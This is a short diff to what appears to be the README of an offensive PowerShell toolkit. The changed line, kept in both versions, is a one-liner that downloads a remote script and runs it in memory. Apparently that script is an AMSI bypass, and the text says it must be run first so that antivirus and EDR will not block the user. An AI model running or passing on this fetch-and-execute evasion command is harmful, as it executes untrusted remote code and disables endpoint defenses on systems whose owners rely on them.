@@ -10,7 +10,7 @@ All the scripts can be used locally but since we're using powershell and we're t
 
 You should definitely start by invoking:
 
-IEX(IWR('https://raw.githubusercontent.com/RaouzRouik/smallposh/main/amsibp-dec-2021-fud.ps1'))![smallposh]
+IEX(IWR('https://raw.githubusercontent.com/RaouzRouik/smallposh/main/amsibp-dec-2021-fud.ps1'))
 
 or else AV/EDR will surely block you right away!
 
